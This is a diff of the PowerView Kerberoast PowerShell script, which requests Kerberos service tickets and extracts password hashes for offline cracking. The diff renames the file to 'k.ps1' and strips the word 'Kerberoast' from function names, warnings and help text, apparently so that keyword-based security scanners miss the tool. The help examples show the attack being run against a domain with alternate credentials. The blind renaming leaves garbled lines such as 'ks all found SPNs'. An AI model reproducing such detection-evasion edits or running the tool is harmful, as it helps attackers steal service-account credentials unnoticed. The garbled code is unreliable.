@@ -1,6 +1,6 @@
 <#
 
-Kerberoast.ps1
+k.ps1
 Author: Will Schroeder (@harmj0y)
 License: BSD 3-Clause
 Required Dependencies: None
@@ -623,7 +623,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
                     # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                     if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
-                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
+                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-kHashFromAPReq"'
                         $Hash = $null
                         $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                     } else {
@@ -631,7 +631,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                         $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                     }
                 } else {
-                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-kHashFromAPReq"
                     $Hash = $null
                     $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                 }
@@ -1015,7 +1015,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 function Invoke-K {
 <#
 .SYNOPSIS
-Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.
+Requests service tickets for k-able accounts and returns extracted ticket hashes.
 Author: Will Schroeder (@harmj0y), @machosec  
 License: BSD 3-Clause  
 Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  
@@ -1056,16 +1056,16 @@ Specifies the delay in seconds between ticket requests.
 Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
 .EXAMPLE
 Invoke-K | fl
-Kerberoasts all found SPNs for the current domain.
+ks all found SPNs for the current domain.
 .EXAMPLE
 Invoke-K -Domain dev.testlab.local -OutputFormat HashCat | fl
-Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
+ks all found SPNs for the testlab.local domain, outputting to HashCat
 format instead of John (the default).
 .EXAMPLE
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
 Invoke-K -Credential $Cred -Verbose -Domain testlab.local | fl
-Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.
+ks all found SPNs for the testlab.local domain using alternate credentials.
 .OUTPUTS
 PowerView.SPNTicket
 Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
